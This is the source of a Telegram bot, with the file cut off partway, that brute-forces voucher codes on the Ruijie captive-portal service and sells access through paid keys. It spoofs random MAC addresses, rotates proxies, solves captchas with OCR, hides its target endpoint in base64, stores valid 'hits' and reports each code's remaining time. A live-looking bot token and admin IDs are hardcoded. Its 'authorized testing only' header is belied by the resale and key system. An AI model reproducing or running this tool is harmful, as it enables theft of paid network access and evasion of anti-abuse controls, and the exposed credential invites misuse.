#!/usr/bin/env python3
"""
Ruijie Voucher Scanner Bot — Recon / Terminal Aesthetic Edition
Authorized testing / owned infrastructure use only.
"""

import asyncio
import base64
import json
import logging
import os
import random
import re
import signal
import sqlite3
import string
import threading
import time
import uuid
from contextlib import contextmanager
from datetime import datetime, timedelta, timezone

import aiohttp
from aiohttp import web
import numpy as np
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

try:
    import ddddocr
except Exception:
    ddddocr = None


# ======================================================
# Configuration
# ======================================================
def load_config() -> dict:
    raw_token = os.environ.get("BOT_TOKEN", "9075953742:AAFMU2SPyaXKLy9tbkIesRqDJ44rFarIIy0").strip()
    raw_admins = [x.strip() for x in os.environ.get("ADMIN_IDS", "6130147402").split(",") if x.strip()]

    return {
        "bot_token": raw_token,
        "admin_ids": raw_admins or ["6130147402"],
        "admin_name": os.environ.get("ADMIN_NAME", "Myogyi10384").strip(),
        "forward_channel": os.environ.get("FORWARD_CHANNEL", "").strip(),
        "max_concurrent": max(1, int(os.environ.get("MAX_CONCURRENT", "30"))),
        "batch_size": max(1, int(os.environ.get("BATCH_SIZE", "20"))),
        "connection_limit": max(10, int(os.environ.get("CONNECTION_LIMIT", "200"))),
        "connection_per_host": max(5, int(os.environ.get("CONNECTION_PER_HOST", "50"))),
        "timeout": max(5, int(os.environ.get("TIMEOUT", "25"))),
        "db_path": os.environ.get("DB_PATH", "bot_data.db").strip(),
        "port": int(os.environ.get("PORT") or os.environ.get("BOT_PORT") or "8099"),
        "max_display_items": 100,
    }


CONFIG = load_config()


class ConsoleTagFormatter(logging.Formatter):
    TAG_MAP = {
        logging.DEBUG: "DBG",
        logging.INFO: "SYS",
        logging.WARNING: "WRN",
        logging.ERROR: "ERR",
        logging.CRITICAL: "CRT",
    }

    def format(self, record: logging.LogRecord) -> str:
        tag = self.TAG_MAP.get(record.levelno, "LOG")
        ts = datetime.now().strftime("%H:%M:%S")
        return f"[{ts}] [{tag}] {record.getMessage()}"


_handler = logging.StreamHandler()
_handler.setFormatter(ConsoleTagFormatter())
logger = logging.getLogger("recon_bot")
logger.setLevel(os.environ.get("LOG_LEVEL", "INFO").upper())
logger.handlers = [_handler]
logger.propagate = False

PROXY_LIST: list[str] = []
if os.environ.get("PROXY_LIST", "").strip():
    PROXY_LIST = [p.strip() for p in os.environ["PROXY_LIST"].split(",") if p.strip()]
    random.shuffle(PROXY_LIST)

VOUCHER_ENDPOINT = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()


# ======================================================
# Database Layer
# ======================================================
class DatabaseManager:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self._lock = threading.Lock()
        self._conn: sqlite3.Connection | None = None
        self._init_schema()

    def _connect(self) -> sqlite3.Connection:
        with self._lock:
            if self._conn is None:
                parent = os.path.dirname(os.path.abspath(self.db_path))
                if parent and not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                conn = sqlite3.connect(self.db_path, timeout=30, check_same_thread=False)
                conn.execute("PRAGMA journal_mode=WAL")
                conn.execute("PRAGMA synchronous=NORMAL")
                conn.execute("PRAGMA cache_size=2000")
                conn.row_factory = sqlite3.Row
                self._conn = conn
            return self._conn

    @contextmanager
    def cursor(self):
        conn = self._connect()
        cur = conn.cursor()
        try:
            yield cur
            conn.commit()
        except Exception:
            conn.rollback()
            raise
        finally:
            cur.close()

    def _init_schema(self) -> None:
        with self.cursor() as c:
            c.execute(
                """CREATE TABLE IF NOT EXISTS keys (
                    key TEXT PRIMARY KEY,
                    user_id TEXT,
                    plan TEXT,
                    expires_at TEXT,
                    code_limit INTEGER DEFAULT 1000,
                    used_codes INTEGER DEFAULT 0
                )"""
            )
            c.execute("CREATE TABLE IF NOT EXISTS results (user_id TEXT PRIMARY KEY, codes TEXT)")
            c.execute(
                """CREATE TABLE IF NOT EXISTS users (
                    user_id TEXT PRIMARY KEY,
                    key TEXT,
                    registered_at TEXT
                )"""
            )
            c.execute(
                """CREATE TABLE IF NOT EXISTS user_settings (
                    user_id TEXT PRIMARY KEY,
                    proxy_enabled INTEGER DEFAULT 1
                )"""
            )
            c.execute(
                """CREATE TABLE IF NOT EXISTS scan_checkpoints (
                    user_id TEXT PRIMARY KEY,
                    mode TEXT,
                    last_code TEXT,
                    start_digit TEXT,
                    timestamp REAL
                )"""
            )

    def close(self) -> None:
        with self._lock:
            if self._conn is not None:
                self._conn.close()
                self._conn = None

    def get_key(self, key: str) -> dict | None:
        with self.cursor() as c:
            c.execute("SELECT * FROM keys WHERE key = ?", (key,))
            row = c.fetchone()
            return dict(row) if row else None

    def get_user(self, user_id: str) -> dict | None:
        with self.cursor() as c:
            c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
            row = c.fetchone()
            return dict(row) if row else None

    def get_user_by_key(self, key: str) -> dict | None:
        with self.cursor() as c:
            c.execute("SELECT * FROM users WHERE key = ?", (key,))
            row = c.fetchone()
            return dict(row) if row else None

    def get_results(self, user_id: str) -> list[str]:
        with self.cursor() as c:
            c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
            row = c.fetchone()
            return json.loads(row[0]) if row else []

    def save_results(self, user_id: str, codes: list[str]) -> None:
        with self.cursor() as c:
            c.execute(
                "INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)",
                (user_id, json.dumps(codes)),
            )

    def add_user(self, user_id: str, key: str) -> None:
        with self.cursor() as c:
            c.execute(
                "INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)",
                (user_id, key, datetime.now(timezone.utc).isoformat()),
            )

    def add_key(self, key: str, user_id: str, plan: str, expires_at: str, code_limit: int) -> None:
        with self.cursor() as c:
            c.execute(
                """INSERT OR REPLACE INTO keys
                   (key, user_id, plan, expires_at, code_limit, used_codes)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (key, user_id, plan, expires_at, code_limit, 0),
            )

    def delete_key(self, key: str) -> None:
        with self.cursor() as c:
            c.execute("DELETE FROM keys WHERE key = ?", (key,))

    def update_used_codes(self, key: str, used_codes: int) -> None:
        with self.cursor() as c:
            c.execute("UPDATE keys SET used_codes = ? WHERE key = ?", (used_codes, key))

    def get_all_keys(self) -> dict[str, dict]:
        with self.cursor() as c:
            c.execute("SELECT * FROM keys")
            return {row["key"]: dict(row) for row in c.fetchall()}

    def get_all_users(self) -> list[str]:
        with self.cursor() as c:
            c.execute("SELECT user_id FROM users")
            return [row["user_id"] for row in c.fetchall()]

    def get_proxy_setting(self, user_id: str) -> bool:
        with self.cursor() as c:
            c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
            row = c.fetchone()
            return bool(row[0]) if row else True

    def set_proxy_setting(self, user_id: str, enabled: bool) -> None:
        with self.cursor() as c:
            c.execute(
                "INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)",
                (user_id, 1 if enabled else 0),
            )

    def save_checkpoint(self, user_id: str, mode: str, last_code: str, start_digit: str | None = None) -> None:
        with self.cursor() as c:
            c.execute(
                """INSERT OR REPLACE INTO scan_checkpoints
                   (user_id, mode, last_code, start_digit, timestamp)
                   VALUES (?, ?, ?, ?, ?)""",
                (user_id, mode, last_code, start_digit, time.time()),
            )

    def clear_checkpoint(self, user_id: str) -> None:
        with self.cursor() as c:
            c.execute("DELETE FROM scan_checkpoints WHERE user_id = ?", (user_id,))


db = DatabaseManager(CONFIG["db_path"])


# ======================================================
# Runtime State & Helpers
# ======================================================
user_data: dict[int, dict] = {}
approve: dict[int, bool] = {}
scan_tasks: dict[int, dict] = {}
success_messages: dict[int, int] = {}
success_texts: dict[int, list[str]] = {}
limited_messages: dict[int, int] = {}
limited_texts: dict[int, list[str]] = {}
paid_users: dict[str, bool] = {}

_start_time = time.monotonic()
_proxy_index = 0
_ocr_engine = None
_ocr_lock = threading.Lock()


def esc_html(text: str) -> str:
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def format_dashboard_card(user_name: str, user_id: str, authorized: bool, proxy_on: bool) -> str:
    role_tag = "ROOT/ADMIN" if is_admin(user_id) else ("AUTH_PAID" if authorized else "GUEST")
    proxy_tag = "ACTIVE" if proxy_on else "BYPASS"
    active_portal = user_data.get(int(user_id), {}).get("session_url", "NOT_SET") if user_id.isdigit() else "NOT_SET"
    short_portal = active_portal if len(active_portal) <= 38 else active_portal[:35] + "..."

    return (
        "<code>┌──────────────────────────────────┐\n"
        "│  ◈ RUIJIE RECON CONSOLE v8.0    │\n"
        "└──────────────────────────────────┘</code>\n"
        f"<code>▸ OP     : {esc_html(user_name[:20])}</code>\n"
        f"<code>▸ UID    : {esc_html(user_id)}</code>\n"
        f"<code>▸ ACCESS : {role_tag}</code>\n"
        f"<code>▸ PROXY  : {proxy_tag}</code>\n"
        f"<code>▸ TARGET : {esc_html(short_portal)}</code>\n"
        f"<code>▸ OWNER  : @{esc_html(CONFIG['admin_name'])}</code>\n\n"
        "<i>Select a module below to execute.</i>"
    )


def get_next_proxy() -> str | None:
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    if not proxy.startswith(("http://", "https://", "socks5://", "socks4://")):
        proxy = f"http://{proxy}"
    return proxy


def check_key_expiration(expires_at: str | None) -> bool:
    if not expires_at:
        return False
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except ValueError:
        return False


def generate_expiry(plan: str) -> str | None:
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None,
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()


def generate_random_key(length: int = 12) -> str:
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))


def is_admin(user_id: str) -> bool:
    return str(user_id) in CONFIG["admin_ids"]


def is_authorized(chat_id: int) -> bool:
    uid = str(chat_id)
    return is_admin(uid) or (uid in paid_users) or bool(approve.get(chat_id))


# ======================================================
# Keyboards & Bot Setup
# ======================================================
bot = AsyncTeleBot(CONFIG["bot_token"], parse_mode="HTML")


async def forward_to_channel(message_text: str) -> None:
    channel = CONFIG["forward_channel"]
    if not channel:
        return
    try:
        await bot.send_message(channel, f"<code>{esc_html(message_text)}</code>")
    except Exception as exc:
        logger.warning("Channel forward failed: %s", exc)


def get_main_keyboard(user_id: str | None = None) -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=2)
    proxy_on = db.get_proxy_setting(user_id) if user_id else True
    proxy_label = "[+] PROXY: ON" if proxy_on else "[-] PROXY: OFF"
    proxy_cb = "menu_proxy_off" if proxy_on else "menu_proxy_on"

    keyboard.add(
        InlineKeyboardButton("[+] AUTH / KEY", callback_data="menu_paid"),
        InlineKeyboardButton("[+] SET PORTAL", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_label, callback_data=proxy_cb),
        InlineKeyboardButton("[=] HITS LOG", callback_data="menu_result"),
        InlineKeyboardButton("[~] RECHECK", callback_data="menu_recheck"),
        InlineKeyboardButton("[x] ABORT SCAN", callback_data="menu_stop"),
        InlineKeyboardButton("[<] REFRESH", callback_data="menu_back"),
    )
    return keyboard


def get_voucher_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("NUM-6 [0-9]", callback_data="scan_6"),
        InlineKeyboardButton("NUM-7 [0-9]", callback_data="scan_7"),
        InlineKeyboardButton("NUM-8 [0-9]", callback_data="scan_8"),
        InlineKeyboardButton("ALPHA-6 [a-z]", callback_data="scan_engsmall6"),
        InlineKeyboardButton("ALPHA-7 [a-z]", callback_data="scan_engsmall7"),
        InlineKeyboardButton("ALPHA-8 [a-z]", callback_data="scan_engsmall8"),
        InlineKeyboardButton("ALNUM-6 [a-z0-9]", callback_data="scan_engmixed6"),
        InlineKeyboardButton("ALNUM-7 [a-z0-9]", callback_data="scan_engmixed7"),
        InlineKeyboardButton("ALNUM-8 [a-z0-9]", callback_data="scan_engmixed8"),
        InlineKeyboardButton("[<] BACK", callback_data="menu_back"),
    )
    return keyboard


def get_digit_keyboard(mode: str) -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = [InlineKeyboardButton(f"[{i}]", callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("[?] RANDOM PREFIX", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("[<] BACK", callback_data="menu_back"))
    return keyboard


def get_start_scam_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("[▶] LAUNCH SCAN", callback_data="menu_start_scam"),
        InlineKeyboardButton("[<] BACK", callback_data="menu_back"),
    )
    return keyboard


def get_paid_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("[+] ENTER KEY", callback_data="menu_enter_key"),
        InlineKeyboardButton("[<] BACK", callback_data="menu_back"),
    )
    return keyboard


def get_back_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("[<] BACK", callback_data="menu_back"))
    return keyboard


def get_scam_button_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("[x] ABORT SCAN", callback_data="menu_stop"),
        InlineKeyboardButton("[<] BACK", callback_data="menu_back"),
    )
    return keyboard


def get_admin_main_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("[+] GEN KEY", callback_data="admin_genkey"),
        InlineKeyboardButton("[-] DEL KEY", callback_data="admin_delkey"),
        InlineKeyboardButton("[=] LIST KEYS", callback_data="admin_listkeys"),
        InlineKeyboardButton("[#] TELEMETRY", callback_data="admin_stats"),
        InlineKeyboardButton("[>] BROADCAST", callback_data="admin_broadcast"),
        InlineKeyboardButton("[@] USERS", callback_data="admin_users"),
        InlineKeyboardButton("[<] MAIN MENU", callback_data="admin_back"),
    )
    return keyboard


def get_admin_genkey_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("30m", callback_data="admin_gen_30m"),
        InlineKeyboardButton("1h", callback_data="admin_gen_1h"),
        InlineKeyboardButton("1d", callback_data="admin_gen_1d"),
        InlineKeyboardButton("7d", callback_data="admin_gen_7d"),
        InlineKeyboardButton("1m", callback_data="admin_gen_1m"),
        InlineKeyboardButton("1y", callback_data="admin_gen_1y"),
        InlineKeyboardButton("UNLIMITED", callback_data="admin_gen_unlimited"),
        InlineKeyboardButton("[<] BACK", callback_data="admin_back"),
    )
    return keyboard


def get_admin_back_keyboard() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("[<] ADMIN PANEL", callback_data="admin_back"))
    return keyboard


# ======================================================
# Commands
# ======================================================
@bot.message_handler(commands=["help"])
async def help_command(message):
    user_id = str(message.chat.id)
    help_text = (
        "<code>┌──────────────────────────────────┐\n"
        "│  ◈ COMMAND REFERENCE             │\n"
        "└──────────────────────────────────┘</code>\n"
        "<code>/start          :: console dashboard\n"
        "/key &lt;token&gt;    :: activate access key\n"
        "/portal &lt;url&gt;   :: bind target portal\n"
        "/scan &lt;mode&gt;    :: start voucher scan\n"
        "/stop           :: abort active scan\n"
        "/result         :: list saved hits\n"
        "/recheck        :: verify saved hits\n"
        "/proxy          :: toggle proxy route\n"
        "/help           :: show manual</code>\n\n"
        "<code>[ADMIN]\n"
        "/admin          :: control panel\n"
        "/genkey &lt;plan&gt; &lt;lim&gt; &lt;uid&gt;\n"
        "/delkey &lt;key&gt;\n"
        "/sendall &lt;msg&gt;\n"
        "/status         :: runtime stats</code>\n\n"
        f"<code>OP_ID :: {esc_html(user_id)}</code>"
    )
    await bot.reply_to(message, help_text)


@bot.message_handler(commands=["start"])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "Operator"
    user_data.setdefault(message.chat.id, {})

    authorized = False
    if is_admin(user_id):
        approve[message.chat.id] = True
        paid_users[user_id] = True
        authorized = True
    else:
        user_info = db.get_user(user_id)
        if user_info:
            key_info = db.get_key(user_info["key"])
            if key_info and check_key_expiration(key_info["expires_at"]):
                approve[message.chat.id] = True
                paid_users[user_id] = True
                authorized = True

    proxy_on = db.get_proxy_setting(user_id)
    card = format_dashboard_card(user_name, user_id, authorized, proxy_on)
    await bot.send_message(message.chat.id, card, reply_markup=get_main_keyboard(user_id))
    await forward_to_channel(f"SESSION_INIT :: uid={user_id} op={user_name}")


@bot.message_handler(commands=["admin"])
async def admin_panel(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "<code>[ERR] ACCESS DENIED :: ROOT REQUIRED</code>")
        return
    text = (
        "<code>┌──────────────────────────────────┐\n"
        f"│  ◈ ROOT PANEL // {esc_html(CONFIG['admin_name'][:14]):14s} │\n"
        "└──────────────────────────────────┘</code>\n"
        "<code>Select administrative operation:</code>"
    )
    await bot.reply_to(message, text, reply_markup=get_admin_main_keyboard())


@bot.message_handler(commands=["status"])
async def status_command(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "<code>[ERR] ACCESS DENIED :: ROOT REQUIRED</code>")
        return
    await stats_command(message)


@bot.message_handler(commands=["key"])
async def handle_key(message):
    user_id = str(message.chat.id)
    if is_admin(user_id):
        await bot.reply_to(message, "<code>[OK] ROOT BYPASS :: KEY NOT REQUIRED</code>")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "<code>USAGE :: /key &lt;your_key&gt;</code>")
        return
    key = args[1].strip()
    key_info = db.get_key(key)
    if not key_info:
        await bot.reply_to(message, "<code>[ERR] INVALID KEY</code>")
        return
    if not check_key_expiration(key_info["expires_at"]):
        await bot.reply_to(message, "<code>[ERR] KEY EXPIRED</code>")
        return
    db.add_user(user_id, key)
    approve[message.chat.id] = True
    paid_users[user_id] = True
    user_data.setdefault(message.chat.id, {})
    await bot.reply_to(
        message,
        "<code>[OK] AUTHENTICATED\n"
        f"UID   :: {esc_html(user_id)}\n"
        f"PLAN  :: {esc_html(key_info['plan'])}\n"
        f"LIMIT :: {key_info['code_limit']}</code>",
    )


@bot.message_handler(commands=["genkey"])
async def genkey(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "<code>[ERR] NO PERMISSION</code>")
        return
    args = message.text.split()
    if len(args) < 4:
        await bot.reply_to(message, "<code>USAGE :: /genkey &lt;plan&gt; &lt;limit&gt; &lt;user_id&gt;</code>")
        return
    plan = args[1]
    try:
        code_limit = int(args[2])
    except ValueError:
        await bot.reply_to(message, "<code>[ERR] LIMIT MUST BE INTEGER</code>")
        return
    target_user_id = args[3]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "<code>[ERR] UNKNOWN PLAN</code>")
        return
    new_key = generate_random_key(12)
    db.add_key(new_key, target_user_id, plan, expiry, code_limit)
    await bot.reply_to(
        message,
        "<code>[OK] KEY ISSUED\n"
        f"KEY :: {new_key}\n"
        f"UID :: {esc_html(target_user_id)}\n"
        f"PLN :: {esc_html(plan)}\n"
        f"EXP :: {esc_html(expiry)}</code>",
    )


@bot.message_handler(commands=["delkey"])
async def delkey(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "<code>[ERR] NO PERMISSION</code>")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "<code>USAGE :: /delkey &lt;key&gt;</code>")
        return
    key = args[1]
    key_info = db.get_key(key)
    if not key_info:
        await bot.reply_to(message, f"<code>[ERR] KEY NOT FOUND :: {esc_html(key)}</code>")
        return
    user_info = db.get_user_by_key(key)
    if user_info:
        try:
            uid_int = int(user_info["user_id"])
            approve.pop(uid_int, None)
            user_data.pop(uid_int, None)
        except ValueError:
            pass
        paid_users.pop(user_info["user_id"], None)
    db.delete_key(key)
    await bot.reply_to(message, f"<code>[OK] KEY REVOKED :: {esc_html(key)}</code>")


@bot.message_handler(commands=["sendall"])
async def send_all_broadcast(message):
    if not is_admin(str(message.chat.id)):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "<code>USAGE :: /sendall &lt;message&gt;</code>")
        return
    broadcast_text = f"<code>[BROADCAST]\n{esc_html(args[1])}</code>"
    users = db.get_all_users()
    sent_count = 0
    for uid in users:
        try:
            await bot.send_message(int(uid), broadcast_text)
            sent_count += 1
            await asyncio.sleep(0.08)
        except Exception as exc:
            logger.debug("Broadcast skip %s: %s", uid, exc)
    await bot.reply_to(message, f"<code>[OK] DISPATCHED :: {sent_count} TARGETS</code>")


# ======================================================
# Network & Portal Helpers
# ======================================================
def get_mac() -> str:
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    octets = [first_byte] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ":".join(f"{b:02x}" for b in octets)


def replace_mac(url: str, new_mac: str) -> str:
    return re.sub(r"(?<=mac=)[^&]+", new_mac, url)


def get_ocr():
    global _ocr_engine
    if ddddocr is None:
        return None
    with _ocr_lock:
        if _ocr_engine is None:
            try:
                _ocr_engine = ddddocr.DdddOcr(show_ad=False)
            except Exception as exc:
                logger.warning("OCR init failed: %s", exc)
                _ocr_engine = None
    return _ocr_engine


def _ocr_sync(image_bytes: bytes) -> str | None:
    ocr = get_ocr()
    if ocr is None or not image_bytes:
        return None
    try:
        result = ocr.classification(image_bytes)
        return result.upper().strip() if result else None
    except Exception as exc:
        logger.debug("OCR error: %s", exc)
        return None


async def captcha_text(image_bytes: bytes) -> str | None:
    return await asyncio.to_thread(_ocr_sync, image_bytes)


async def check_session_url(session_url: str, use_proxy: bool = True) -> bool:
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    }
    proxy = get_next_proxy() if use_proxy else None
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy) as resp:
                if resp.status >= 400:
                    return False
                final_url = str(resp.url)
                keywords = ["sessionId", "portal", "maccauth", "index.html", "wifidog", "gw_id", "gw_sn", "auth"]
                if any(k in final_url for k in keywords):
                    return True
                if "text/html" in resp.headers.get("content-type", ""):
                    html = await resp.text()
                    if any(k in html for k in ["sessionId", "accessCode", "portal", "maccauth"]):
                        return True
                return resp.status == 200
    except Exception as exc:
        logger.error("Portal probe failed: %s", exc)
        return False


async def get_session_id(session: aiohttp.ClientSession, session_url: str, proxy: str | None = None) -> str | None:
    url = replace_mac(session_url, get_mac())
    match_direct = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", url)
    if match_direct:
        return match_direct.group(1)

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(url, headers=headers, allow_redirects=True, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            final_url = str(resp.url)
            match_redir = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final_url)
            if match_redir:
                return match_redir.group(1)

            if "text/html" in resp.headers.get("content-type", ""):
                text = await resp.text()
                for pattern in (
                    r"sessionId['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9]+)['\"]",
                    r'<input[^>]*name=["\']sessionId["\'][^>]*value=["\']([a-zA-Z0-9]+)["\']',
                ):
                    m = re.search(pattern, text, re.IGNORECASE)
                    if m:
                        return m.group(1)
    except Exception as exc:
        logger.debug("Session ID extract error: %s", exc)
    return None


@bot.message_handler(commands=["portal"])
async def handle_portal(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    if not is_authorized(chat_id):
        await bot.reply_to(message, "<code>[ERR] UNAUTHORIZED :: REGISTER KEY FIRST</code>")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "<code>USAGE :: /portal &lt;portal_url&gt;</code>")
        return

    url = args[1].strip()
    user_data.setdefault(chat_id, {})

    if is_admin(user_id):
        user_data[chat_id]["session_url"] = url
        await bot.reply_to(
            message,
            "<code>[OK] TARGET BOUND (ROOT BYPASS)\nSelect scan mode:</code>",
            reply_markup=get_voucher_keyboard(),
        )
        return

    wait_msg = await bot.reply_to(message, "<code>[NET] PROBING TARGET PORTAL...</code>")
    use_proxy = db.get_proxy_setting(user_id)
    if await check_session_url(url, use_proxy=use_proxy):
        user_data[chat_id]["session_url"] = url
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=wait_msg.message_id,
            text="<code>[OK] TARGET BOUND\nSelect scan mode:</code>",
            reply_markup=get_voucher_keyboard(),
        )
    else:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=wait_msg.message_id,
            text="<code>[ERR] TARGET UNREACHABLE OR INVALID</code>",
        )


async def fetch_captcha(session: aiohttp.ClientSession, session_id: str, proxy: str | None) -> bytes:
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "image/avif,image/webp,image/*,*/*;q=0.8",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    }
    params = {"sessionId": session_id, "_t": str(time.time())}
    async with session.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params=params,
        headers=headers,
        proxy=proxy,
    ) as resp:
        return await resp.read()


async def verify_captcha(session: aiohttp.ClientSession, session_id: str, auth_code: str, proxy: str | None) -> bool:
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    }
    payload = {"sessionId": session_id, "authCode": auth_code}
    async with session.post(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        headers=headers,
        json=payload,
        proxy=proxy,
    ) as resp:
        data = await resp.json(content_type=None)
        return isinstance(data, dict) and data.get("success") is True


async def get_code_expires_info(session: aiohttp.ClientSession, active_id: str, proxy: str | None) -> str:
    paths = [
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}",
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}",
    ]
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    for url in paths:
        try:
            async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    if isinstance(data, dict) and data.get("success"):
                        result = data.get("result", {})
                        raw_minutes = result.get("totalMinutes") or result.get("remainingMinutes")
                        profile_name = result.get("profileName", "Unknown")
                        if raw_minutes is not None:
                            mins = int(raw_minutes)
                            hh, mm = divmod(mins, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                            return f"PLAN={profile_name} | TTL={time_str}"
        except Exception as exc:
            logger.debug("Balance probe failed for %s: %s", url, exc)
    return "PLAN=UNKNOWN | TTL=UNKNOWN"


async def perform_check(
    session_url: str,
    code: str,
    chat_id: int,
    scan_id: str | None = None,
    recheck: bool = False,
    message=None,
    shared_session: aiohttp.ClientSession | None = None,
):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return None

    use_proxy = db.get_proxy_setting(str(chat_id))
    own_session = shared_session is None
    session = shared_session or aiohttp.ClientSession(
        cookie_jar=aiohttp.CookieJar(),
        timeout=aiohttp.ClientTimeout(total=CONFIG["timeout"]),
    )

    response_text = ""
    session_id = None

    try:
        for attempt in range(3):
            proxy = get_next_proxy() if use_proxy else None
            try:
                session_id = await get_session_id(session, session_url, proxy=proxy)
                if not session_id:
                    await asyncio.sleep(0.5 * (attempt + 1))
